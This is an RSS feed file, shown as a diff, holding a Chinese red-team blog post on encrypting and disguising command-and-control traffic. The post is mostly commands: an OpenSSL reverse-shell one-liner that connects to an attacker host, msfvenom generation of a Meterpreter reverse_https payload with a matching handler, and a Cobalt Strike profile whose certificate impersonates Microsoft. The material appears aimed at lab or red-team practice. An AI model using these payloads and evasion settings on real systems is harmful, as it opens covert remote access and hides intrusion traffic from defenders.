@@ -1,0 +1,132 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>红队蓝队 on fragrant1001</title>
+        <link>https://fragrant1001.github.io/tags/%E7%BA%A2%E9%98%9F%E8%93%9D%E9%98%9F/</link>
+        <description>Recent content in 红队蓝队 on fragrant1001</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-Hans</language>
+        <lastBuildDate>Thu, 02 Nov 2023 10:02:40 +0800</lastBuildDate><atom:link href="https://fragrant1001.github.io/tags/%E7%BA%A2%E9%98%9F%E8%93%9D%E9%98%9F/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>流量传输加密混淆</title>
+        <link>https://fragrant1001.github.io/post/2023/encryptedflow/</link>
+        <pubDate>Thu, 02 Nov 2023 10:02:40 +0800</pubDate>
+        
+        <guid>https://fragrant1001.github.io/post/2023/encryptedflow/</guid>
+        <description>&lt;img src="https://fragrant1001.github.io/post/2023/encryptedflow/beacon.jpg" alt="Featured image of post 流量传输加密混淆" /&gt;&lt;h3 id=&#34;openssl反弹shell&#34;&gt;Openssl反弹shell&lt;/h3&gt;
+&lt;p&gt;既然是openssl反弹的shell，那么流量自然是加密的。&lt;br&gt;
+攻击机：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//生成自签名证书
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+//监听本地端口
+openssl s_server -quiet -key key.pem -cert cert.pem -port 8989
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被攻击机：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//反弹shell
+mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 10.0.0.116:8989 &amp;gt; /tmp/s;rm /tmp/s
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image.png&#34;
+	width=&#34;2360&#34;
+	height=&#34;1290&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image_hu9f7c53e74f40e5e113f256748410628a_1267977_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;opensslshell&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;182&#34;
+		data-flex-basis=&#34;439px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;msf流量加密&#34;&gt;msf流量加密&lt;/h3&gt;
+&lt;p&gt;首先openssl生成证书，msfvenom生成木马的时候使用该证书。其次攻击机本地设置监听的时候要带上刚刚生成的证书文件。&lt;br&gt;
+攻击机：&lt;br&gt;
+生成木马&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//openssl生成证书
+openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &amp;#34;/C=UK/ST=London/L=London/O=Development/CN=www.google.com&amp;#34; -keyout www.google.com.key -out www.google.com.crt &amp;amp;&amp;amp; cat www.google.com.key www.google.com.crt &amp;gt; www.google.com.pem &amp;amp;&amp;amp; rm -f www.google.com.key www.google.com.crt
+//msfvenom使用证书生成木马
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.116 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -a x64 --platform windows -o pentestlab.bat
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配置加密监听&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 10.0.0.116
+set LPORT 443
+set HandlerSSLCert /home/kali/hongri/openssltest/www.google.com.pem
+set StagerVerifySSLCert true
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;被攻击机：&lt;br&gt;
+直接运行木马即可
+&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-1.png&#34;
+	width=&#34;2082&#34;
+	height=&#34;1334&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-1_huad5e14b259aeee482cca0751b8e4bb48_1587267_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;加密后的流量&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;374px&#34;
+	
+&gt;
+&lt;code&gt;show advanced&lt;/code&gt; 查看高级配置&lt;/p&gt;
+&lt;h3 id=&#34;cs加密混淆&#34;&gt;CS加密混淆&lt;/h3&gt;
+&lt;p&gt;Cobalt Strike修改C2 profile&lt;/p&gt;
+&lt;p&gt;攻击机：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//生成证书并记住密码和填的字段
+//frasec和frasec.store以及密码等都要要填写到profile文件里面
+keytool -genkey -alias frasec -keyalg RSA -validity 36500 -keystore frasec.store
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-2.png&#34;
+	width=&#34;1788&#34;
+	height=&#34;686&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-2_hue72c18e7a08c788388e39d997cec038c_648682_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;keytool create certification&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;260&#34;
+		data-flex-basis=&#34;625px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;新建frasec.profile配置文件，主要修改内容：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https-certificate {
+    set CN       &amp;#34;Microsoft&amp;#34;; #Common Name
+    set O        &amp;#34;MicrosoftUpdates&amp;#34;; #Organization Name
+    set C        &amp;#34;en&amp;#34;; #Country
+    set L        &amp;#34;US&amp;#34;; #Locality
+    set OU       &amp;#34;MicrosoftUpdates&amp;#34;; #Organizational Unit Name
+    set ST       &amp;#34;US&amp;#34;; #State or Province
+    set validity &amp;#34;36500&amp;#34;; #Number of days the cert is valid for
+}
+
+code-signer{
+    set keystore &amp;#34;frasec.store&amp;#34;;
+    set password &amp;#34;123456&amp;#34;;
+    set alias &amp;#34;frasec&amp;#34;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其它内容可做适当更改&lt;br&gt;
+启动服务端&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo ./teamserver 10.0.0.116 pass14 frasec.profile
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;客户端连接后生成https的木马即可，加密流量如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-3.png&#34;
+	width=&#34;2436&#34;
+	height=&#34;814&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/encryptedflow/image-3_hu6e5f035865b2346a07115945fe6f5877_560436_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;cs encrypted flow&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;299&#34;
+		data-flex-basis=&#34;718px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/rsmudge/Malleable-C2-Profiles&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/rsmudge/Malleable-C2-Profiles&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
